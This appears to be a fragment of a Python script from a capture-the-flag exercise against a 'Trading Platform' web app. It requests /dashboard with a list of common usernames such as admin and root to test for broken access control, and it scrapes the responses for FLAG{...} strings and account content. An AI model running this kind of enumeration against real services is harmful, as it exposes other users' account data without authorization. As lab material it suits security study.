usernames = ["test", "admin", "root", "flag", "user", "john", "administrator", "system"]

for username in usernames:
    resp = session.get(base_url + f"/dashboard?username={username}")
    print(f"--- /dashboard?username={username} ---")
    print(f"Status: {resp.status_code}")

    if "FLAG{" in resp.text:
        flag = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag:
            print(f"*** FLAG FOUND: {flag.group(0)} ***")
        else:
            print("FLAG detected but couldn't extract pattern")

    if "Welcome" in resp.text or "Balance" in resp.text or "Account" in resp.text:
        matches = re.findall(r'<p[^>]*>([^<]+)</p>', resp.text)
        for match in matches:
            if len(match.strip()) > 0 and not match.startswith('<'):
                print(f"  Content: {match.strip()}")

    if resp.status_code == 200 and "Trading Platform" not in resp.text[:100]:
        print(f"First 300 chars: {resp.text[:300]}")
